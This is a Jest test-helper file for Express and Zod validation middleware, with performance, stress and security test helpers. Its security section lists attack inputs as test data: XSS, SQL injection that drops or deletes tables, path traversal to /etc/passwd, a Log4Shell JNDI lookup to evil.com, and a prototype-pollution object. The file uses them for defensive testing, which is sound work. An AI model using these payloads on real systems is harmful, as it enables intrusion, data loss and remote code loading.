// backend/src/tests/__helpers__/validate.helper.ts

import { Request, Response, NextFunction } from 'express';
import { z } from 'zod';
import { beforeEach, afterEach, describe, it, expect } from '@jest/globals';
import { 
  validate, 
  validateBody, 
  validateQuery, 
  validateParams,
  validateFile,
  createValidationMiddleware 
} from '../../middlewares/validate';
import { ApiError } from '../../utils/ApiError';
import {
  createMockRequest,
  createMockResponse,
  createMockNext,
  TestSchema,
  mockValidData,
  mockInvalidData,
  expectValidationError,
  expectApiError,
  expectNoError,
  generateLargeDataset
} from '../__mocks__/validate.mock';

// ==================== SETUP HELPERS ====================

const setupValidationTestEnvironment = () => {
  beforeEach(() => {
    jest.clearAllMocks();
    // Clear any cached validation results
    jest.resetModules();
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });
};

// ==================== MIDDLEWARE TESTING HELPERS ====================

const testMiddlewareWithData = async (
  middleware: (req: Request, res: Response, next: NextFunction) => void | Promise<void>,
  requestData: any,
  source: 'body' | 'query' | 'params' = 'body'
) => {
  const req = createMockRequest({ [source]: requestData }) as Request;
  const res = createMockResponse() as Response;
  const next = createMockNext();

  await middleware(req, res, next);

  return { req, res, next };
};

const expectMiddlewareSuccess = (
  req: Request,
  next: jest.MockedFunction<NextFunction>,
  expectedData?: any,
  source: 'body' | 'query' | 'params' = 'body'
) => {
  expectNoError(next);
  
  if (expectedData) {
    expect(req[source]).toEqual(expectedData);
  }
};

const expectMiddlewareError = (
  next: jest.MockedFunction<NextFunction>,
  expectedErrorCode?: string,
  expectedStatusCode?: number
) => {
  expect(next).toHaveBeenCalledWith(expect.any(Error));
  
  const error = next.mock.calls[0][0] as any;
  
  if (expectedErrorCode) {
    expect(error.code).toBe(expectedErrorCode);
  }
  
  if (expectedStatusCode) {
    expect(error.statusCode).toBe(expectedStatusCode);
  }
  
  return error;
};

// ==================== VALIDATION FLOW TESTING ====================

const testValidationFlow = (
  validatorFactory: (schema: z.ZodSchema) => any,
  schema: z.ZodSchema,
  source: 'body' | 'query' | 'params' = 'body'
) => {
  return {
    withValidData: async (validData: any) => {
      const middleware = validatorFactory(schema);
      const result = await testMiddlewareWithData(middleware, validData, source);
      expectMiddlewareSuccess(result.req, result.next, validData, source);
      return result;
    },
    
    withInvalidData: async (invalidData: any) => {
      const middleware = validatorFactory(schema);
      const result = await testMiddlewareWithData(middleware, invalidData, source);
      const error = expectMiddlewareError(result.next, 'VALIDATION_ERROR', 400);
      return { ...result, error };
    },
    
    withMissingData: async () => {
      const middleware = validatorFactory(schema);
      const result = await testMiddlewareWithData(middleware, undefined, source);
      const error = expectMiddlewareError(result.next);
      return { ...result, error };
    }
  };
};

// ==================== SCHEMA VALIDATION HELPERS ====================

const testSchemaValidation = (schema: z.ZodSchema) => ({
  expectValid: (data: any) => {
    const result = schema.safeParse(data);
    expect(result.success).toBe(true);
    return result;
  },
  
  expectInvalid: (data: any, expectedErrorCount?: number) => {
    const result = schema.safeParse(data);
    expect(result.success).toBe(false);
    
    if (!result.success && expectedErrorCount) {
      expect(result.error.issues).toHaveLength(expectedErrorCount);
    }
    
    return result;
  },
  
  expectTransformation: (input: any, expectedOutput: any) => {
    const result = schema.safeParse(input);
    expect(result.success).toBe(true);
    
    if (result.success) {
      expect(result.data).toEqual(expectedOutput);
    }
    
    return result;
  }
});

// ==================== PERFORMANCE TESTING HELPERS ====================

const testValidationPerformance = (
  validatorName: string,
  validatorFunction: (data: any) => any,
  testDataGenerator: (size: number) => any[],
  expectedMaxTime: number = 1000 // 1 second
) => {
  describe(`${validatorName} Performance Tests`, () => {
    it(`should handle batch validation within ${expectedMaxTime}ms`, async () => {
      const batchSize = 100;
      const testData = testDataGenerator(batchSize);
      
      const startTime = performance.now();
      
      const results = await Promise.all(
        testData.map(data => {
          try {
            return validatorFunction(data);
          } catch (error) {
            return { error };
          }
        })
      );
      
      const endTime = performance.now();
      const executionTime = endTime - startTime;
      
      expect(executionTime).toBeLessThan(expectedMaxTime);
      expect(results).toHaveLength(batchSize);
      
      // Most should succeed (assuming valid test data)
      const successCount = results.filter(r => !r.error).length;
      expect(successCount).toBeGreaterThan(batchSize * 0.8); // 80% success rate
    });
    
    it('should handle large individual validation efficiently', async () => {
      const largeData = testDataGenerator(1)[0]; // Single large item
      
      const startTime = performance.now();
      const result = validatorFunction(largeData);
      const endTime = performance.now();
      
      const executionTime = endTime - startTime;
      expect(executionTime).toBeLessThan(100); // 100ms for single validation
    });
  });
};

// ==================== CONCURRENT TESTING HELPERS ====================

const testConcurrentValidation = (
  validatorFactory: (schema: z.ZodSchema) => any,
  schema: z.ZodSchema,
  concurrency: number = 10
) => {
  return async () => {
    const promises = Array(concurrency).fill(0).map(async (_, i) => {
      const middleware = validatorFactory(schema);
      const testData = {
        name: `Concurrent User ${i}`,
        email: `user${i}@example.com`,
        age: 20 + i
      };
      
      const result = await testMiddlewareWithData(middleware, testData);
      return result;
    });
    
    const startTime = performance.now();
    const results = await Promise.all(promises);
    const endTime = performance.now();
    
    const executionTime = endTime - startTime;
    
    // All should succeed
    results.forEach(result => {
      expectNoError(result.next);
    });
    
    // Should complete reasonably quickly
    expect(executionTime).toBeLessThan(2000); // 2 seconds for 10 concurrent validations
    
    return { results, executionTime };
  };
};

// ==================== ERROR TESTING HELPERS ====================

const testErrorScenarios = (
  validatorName: string,
  validatorFactory: (schema: z.ZodSchema) => any,
  schema: z.ZodSchema
) => {
  describe(`${validatorName} Error Scenarios`, () => {
    it('should handle malformed schema gracefully', async () => {
      const malformedSchema = null as any;
      
      expect(() => {
        validatorFactory(malformedSchema);
      }).not.toThrow(); // Should not throw during middleware creation
      
      // But should handle errors during validation
      const middleware = validatorFactory(schema);
      const result = await testMiddlewareWithData(middleware, null);
      
      expect(result.next).toHaveBeenCalledWith(expect.any(Error));
    });
    
    it('should handle circular reference data', async () => {
      const circularData: any = { name: 'Test' };
      circularData.self = circularData; // Create circular reference
      
      const middleware = validatorFactory(schema);
      const result = await testMiddlewareWithData(middleware, circularData);
      
      // Should handle gracefully without infinite loops
      expect(result.next).toHaveBeenCalled();
      expect(performance.now()).toBeDefined(); // Test didn't hang
    });
    
    it('should handle very large data objects', async () => {
      const largeData = {
        name: 'Test User',
        email: 'test@example.com',
        description: 'A'.repeat(100000), // 100KB string
        tags: Array(10000).fill('tag') // Large array
      };
      
      const middleware = validatorFactory(schema);
      const result = await testMiddlewareWithData(middleware, largeData);
      
      // Should complete within reasonable time
      expect(result.next).toHaveBeenCalled();
    });
  });
};

// ==================== SECURITY TESTING HELPERS ====================

const testSecurityScenarios = (
  validatorName: string,
  validatorFactory: (schema: z.ZodSchema) => any,
  schema: z.ZodSchema
) => {
  describe(`${validatorName} Security Tests`, () => {
    const maliciousInputs = [
      { name: "<script>alert('xss')</script>", email: 'test@example.com' },
      { name: "'; DROP TABLE users; --", email: 'test@example.com' },
      { name: 'Test', email: "admin'; DELETE FROM sessions; --" },
      { name: '../../../etc/passwd', email: 'test@example.com' },
      { name: '${jndi:ldap://evil.com/a}', email: 'test@example.com' }
    ];
    
    maliciousInputs.forEach((maliciousInput, index) => {
      it(`should sanitize malicious input ${index + 1}`, async () => {
        const middleware = validatorFactory(schema);
        const result = await testMiddlewareWithData(middleware, maliciousInput);
        
        // Should either reject the input or sanitize it
        if (result.next.mock.calls.length > 0 && result.next.mock.calls[0][0]) {
          // Validation failed - this is acceptable for security
          const error = result.next.mock.calls[0][0];
          expect(error).toBeDefined();
        } else {
          // Validation passed - check that data is not reflected in error messages
          expect(result.req.body).toBeDefined();
          // Add specific sanitization checks if needed
        }
      });
    });
    
    it('should prevent prototype pollution', async () => {
      const pollutionAttempt = {
        name: 'Test',
        email: 'test@example.com',
        '__proto__': { admin: true },
        'constructor': { prototype: { admin: true } }
      };
      
      const middleware = validatorFactory(schema);
      const result = await testMiddlewareWithData(middleware, pollutionAttempt);
      
      // Should not pollute Object prototype
      expect(Object.prototype).not.toHaveProperty('admin');
      expect({}).not.toHaveProperty('admin');
    });
  });
};

// ==================== INTEGRATION TESTING HELPERS ====================

const testValidationIntegration = () => {
  describe('Validation Integration Tests', () => {
    it('should work with multiple validation middleware in sequence', async () => {
      const bodyValidator = validateBody(TestSchema);
      const paramsValidator = validateParams(z.object({ id: z.string().uuid() }));
      
      const req = createMockRequest({
        body: mockValidData.body,
        params: { id: '123e4567-e89b-12d3-a456-426614174000' }
      }) as Request;
      const res = createMockResponse() as Response;
      const next = createMockNext();
      
      // First middleware
      await bodyValidator(req, res, next);
      expect(next).toHaveBeenCalledWith(); // Should pass
      
      // Second middleware
      next.mockClear();
      await paramsValidator(req, res, next);
      expect(next).toHaveBeenCalledWith(); // Should pass
      
      // Both validations should have succeeded
      expect(req.body).toEqual(mockValidData.body);
      expect(req.params.id).toBe('123e4567-e89b-12d3-a456-426614174000');
    });
    
    it('should stop validation chain on first error', async () => {
      const bodyValidator = validateBody(TestSchema);
      const paramsValidator = validateParams(z.object({ id: z.string().uuid() }));
      
      const req = createMockRequest({
        body: mockInvalidData.body, // Invalid body
        params: { id: '123e4567-e89b-12d3-a456-426614174000' }
      }) as Request;
      const res = createMockResponse() as Response;
      const next = createMockNext();
      
      // First middleware should fail
      await bodyValidator(req, res, next);
      expect(next).toHaveBeenCalledWith(expect.any(Error));
      
      // In real app, second middleware wouldn't run due to error
      // But we can test it would work if called
      const error = next.mock.calls[0][0] as any;
      expect(error.code).toBe('VALIDATION_ERROR');
    });
  });
};

// ==================== STRESS TESTING HELPERS ====================

const createValidationStressTests = (
  validatorName: string,
  validatorFactory: (schema: z.ZodSchema) => any,
  schema: z.ZodSchema
) => {
  describe(`${validatorName} Stress Tests`, () => {
    it('should handle rapid sequential validations', async () => {
      const middleware = validatorFactory(schema);
      const iterations = 1000;
      
      const startTime = performance.now();
      
      for (let i = 0; i < iterations; i++) {
        const testData = {
          name: `User ${i}`,
          email: `user${i}@example.com`,
          age: 20 + (i % 50)
        };
        
        const result = await testMiddlewareWithData(middleware, testData);
        expectNoError(result.next);
      }
      
      const endTime = performance.now();
      const executionTime = endTime - startTime;
      
      // Should handle 1000 validations in reasonable time
      expect(executionTime).toBeLessThan(5000); // 5 seconds
      const avgTimePerValidation = executionTime / iterations;
      expect(avgTimePerValidation).toBeLessThan(5); // 5ms per validation
    });
    
    it('should handle memory pressure gracefully', async () => {
      const middleware = validatorFactory(schema);
      const largeDatasets = Array(100).fill(0).map(() => generateLargeDataset(100));
      
      const startMemoryUsage = process.memoryUsage().heapUsed;
      
      // Process large datasets
              for (const dataset of largeDatasets) {
        for (const data of dataset) {
          const result = await testMiddlewareWithData(middleware, data);
          // Don't need to check results, just ensure no memory leaks
        }
      }
      
      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }
      
      const endMemoryUsage = process.memoryUsage().heapUsed;
      const memoryIncrease = endMemoryUsage - startMemoryUsage;
      
      // Memory usage shouldn't grow excessively (allow for some variance)
      expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024); // 100MB threshold
    });
  });
};

// ==================== CUSTOM MATCHERS ====================

const customMatchers = {
  toBeValidationError: (received: any, expectedCode?: string) => {
    const pass = received instanceof Error &&
                 (received as any).statusCode === 400 &&
                 (expectedCode ? (received as any).code === expectedCode : (received as any).code === 'VALIDATION_ERROR');
    
    return {
      pass,
      message: () => pass
        ? `Expected ${received} not to be a validation error`
        : `Expected ${received} to be a validation error with code ${expectedCode || 'VALIDATION_ERROR'}`
    };
  },
  
  toBeApiError: (received: any, expectedCode?: string, expectedStatusCode?: number) => {
    const pass = received instanceof ApiError &&
                 (expectedCode ? received.code === expectedCode : true) &&
                 (expectedStatusCode ? received.statusCode === expectedStatusCode : true);
    
    return {
      pass,
      message: () => pass
        ? `Expected ${received} not to be an ApiError`
        : `Expected ${received} to be an ApiError`
    };
  },
  
  toHaveValidationContext: (received: any, expectedKeys?: string[]) => {
    const pass = received instanceof ApiError &&
                 received.context &&
                 (expectedKeys ? expectedKeys.every(key => key in received.context!) : true);
    
    return {
      pass,
      message: () => pass
        ? `Expected ApiError not to have validation context`
        : `Expected ApiError to have validation context with keys: ${expectedKeys?.join(', ')}`
    };
  }
};

// ==================== TEST DATA FACTORIES ====================

const createTestDataFactory = () => ({
  validUser: (overrides = {}) => ({
    name: 'John Doe',
    email: 'john@example.com',
    age: 25,
    ...overrides
  }),
  
  invalidUser: (type: 'missing_name' | 'invalid_email' | 'under_age' | 'wrong_type' = 'missing_name') => {
    const base = { name: 'John Doe', email: 'john@example.com', age: 25 };
    
    switch (type) {
      case 'missing_name':
        return { email: base.email, age: base.age };
      case 'invalid_email':
        return { ...base, email: 'invalid-email' };
      case 'under_age':
        return { ...base, age: 15 };
      case 'wrong_type':
        return { ...base, age: 'twenty-five' };
      default:
        return base;
    }
  },
  
  validFile: (overrides = {}) => ({
    fieldname: 'image',
    originalname: 'test.jpg',
    encoding: '7bit',
    mimetype: 'image/jpeg',
    size: 1024,
    buffer: Buffer.from('test'),
    ...overrides
  } as Express.Multer.File),
  
  invalidFile: (type: 'wrong_type' | 'too_large' | 'path_traversal' = 'wrong_type') => {
    const base = {
      fieldname: 'image',
      originalname: 'test.jpg',
      encoding: '7bit',
      mimetype: 'image/jpeg',
      size: 1024,
      buffer: Buffer.from('test')
    };
    
    switch (type) {
      case 'wrong_type':
        return { ...base, mimetype: 'application/pdf', originalname: 'doc.pdf' };
      case 'too_large':
        return { ...base, size: 10 * 1024 * 1024 }; // 10MB
      case 'path_traversal':
        return { ...base, originalname: '../../../etc/passwd' };
      default:
        return base;
    }
  }
});

// ==================== VALIDATION PIPELINE TESTING ====================

const testValidationPipelineSteps = async (
  pipelineName: string,
  steps: Array<{
    name: string;
    validator: (req: Request, res: Response, next: NextFunction) => void | Promise<void>;
    testData: any;
    source: 'body' | 'query' | 'params';
  }>
) => {
  // Test with valid data
  const req = createMockRequest() as Request;
  const res = createMockResponse() as Response;
  const next = createMockNext();
  
  // Set up test data for each step
  steps.forEach(step => {
    req[step.source] = step.testData;
  });
  
  // Run each validation step
  for (const step of steps) {
    next.mockClear();
    await step.validator(req, res, next);
    expectNoError(next);
  }
  
  return { req, res, next };
};

const testValidationPipelineFailure = async (
  steps: Array<{
    name: string;
    validator: (req: Request, res: Response, next: NextFunction) => void | Promise<void>;
    testData: any;
    source: 'body' | 'query' | 'params';
  }>,
  failAtStep: number = 1
) => {
  const req = createMockRequest() as Request;
  const res = createMockResponse() as Response;
  const next = createMockNext();
  
  // Set up valid data for all but the specified failing step
  steps.forEach((step, index) => {
    req[step.source] = index === failAtStep ? null : step.testData;
  });
  
  // Run steps until failure
  for (let i = 0; i <= failAtStep && i < steps.length; i++) {
    next.mockClear();
    await steps[i].validator(req, res, next);
    
    if (i === failAtStep) {
      expectMiddlewareError(next, 'VALIDATION_ERROR', 400);
      break;
    } else {
      expectNoError(next);
    }
  }
  
  return { req, res, next };
};

// Updated function that doesn't create nested describe blocks
export const validatePipelineTests = {
  testValidData: testValidationPipelineSteps,
  testFailure: testValidationPipelineFailure
};

// ==================== ADDITIONAL HELPERS ====================

export const generateMixedTestData = (batchSize: number) => {
  return Array(batchSize).fill(0).map((_, i) => {
    // Create exactly 50% valid and 50% invalid data
    if (i % 2 === 0) {
      // Valid data
      return {
        name: `Valid User ${i}`,
        email: `user${i}@example.com`,
        age: 25
      };
    } else {
      // Invalid data - empty name will fail validation
      return {
        name: '', // This will fail the min(1) validation
        email: `user${i}@example.com`,
        age: 25
      };
    }
  });
};

// Enhanced test schema that properly validates the mixed data
export const createTestSchemaForMixedData = () => {
  return z.object({
    name: z.string().min(1, 'Name is required'), // This will catch empty strings
    email: z.string().email('Invalid email format'),
    age: z.number().min(18, 'Must be at least 18').optional()
  });
};

// Fix for the information disclosure test - create a schema that will properly fail
export const createInformationDisclosureTestSchema = () => {
  return z.object({
    publicField: z.string().min(1, 'Public field is required'), // This will fail for empty string
    // These fields should not appear in error messages
    apiKey: z.string().optional(),
    internalSecret: z.string().optional(),  
    databasePassword: z.string().optional()
  }).strict(); // Reject unknown properties
};

// Test data that will cause validation to fail for information disclosure test
export const createProbeDataForDisclosureTest = () => {
  return {
    publicField: '', // Invalid - empty string will cause validation error
    unknownField: 'probe for hidden fields',
    apiKey: 'trying to find secrets',
    __proto__: { admin: true }
  };
};

// ==================== EXPORT ALL HELPERS ====================

export {
  // Setup
  setupValidationTestEnvironment,
  
  // Testing utilities
  testMiddlewareWithData,
  expectMiddlewareSuccess,
  expectMiddlewareError,
  testValidationFlow,
  testSchemaValidation,
  
  // Performance testing
  testValidationPerformance,
  testConcurrentValidation,
  
  // Error and security testing
  testErrorScenarios,
  testSecurityScenarios,
  
  // Integration testing
  testValidationIntegration,
  
  // Stress testing
  createValidationStressTests,
  
  // Custom matchers
  customMatchers,
  
  // Test data factories
  createTestDataFactory,
  
  // Pipeline testing
  testValidationPipelineSteps,

  // Pipeline failure testing
  testValidationPipelineFailure
};

// Export default helper object
export default {
  setupValidationTestEnvironment,
  testMiddlewareWithData,
  expectMiddlewareSuccess,
  expectMiddlewareError,
  testValidationFlow,
  testSchemaValidation,
  testValidationPerformance,
  testConcurrentValidation,
  testErrorScenarios,
  testSecurityScenarios,
  testValidationIntegration,
  createValidationStressTests,
  customMatchers,
  createTestDataFactory
};